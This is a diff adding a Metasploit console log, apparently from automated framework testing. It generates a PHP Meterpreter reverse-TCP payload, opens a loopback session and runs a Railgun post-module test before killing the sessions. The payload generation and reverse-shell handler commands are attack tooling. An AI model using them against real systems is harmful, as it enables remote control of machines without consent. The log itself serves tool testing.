@@ -1,0 +1,28 @@
+use php/meterpreter_reverse_tcp
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-3060-kz4abbtxt
+msf6 payload(php/meterpreter_reverse_tcp) > msf6 payload(php/meterpreter_reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-3060-kz4abbtxt
+msf6 payload(php/meterpreter_reverse_tcp) > generate -o D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20231026-3060-3squd0.php -f raw AutoVerifySessionTimeout=30 lport=6002 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/phpmeterpreter_reverse_tcp_debug_log20231026-3060-arkw1ytxt MeterpreterDebugBuild=true
+[*] Writing 34914 bytes to D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20231026-3060-3squd0.php...
+msf6 payload(php/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 1
+msf6 payload(php/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6002 
+[*] Meterpreter session 2 opened (127.0.0.1:6002 -> 127.0.0.1:50003) at 2023-10-26 19:03:58 +0000
+use test/railgun_reverse_lookups
+msf6 post(test/railgun_reverse_lookups) > run session=2 AddEntropy=true Verbose=true
+[*] Running against session 2
+[*] Session type is meterpreter and platform is windows
+[*] SKIPPED: def test_osx_static (session platform is not osx)
+[*] SKIPPED: def test_linux_static (session platform is not osx)
+[*] SKIPPED: def test_windows_static (session does not support COMMAND_ID_STDAPI_RAILGUN_API)
+[*] SKIPPED: def test_windows_datastore (session does not support COMMAND_ID_STDAPI_RAILGUN_API)
+[*] Testing complete in 0.0 seconds
+[*] Passed: 4; Failed: 0; Skipped: 4
+[*] Post module execution completed
+msf6 post(test/railgun_reverse_lookups) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 2 closed.
+msf6 post(test/railgun_reverse_lookups) > Stopping all jobs...
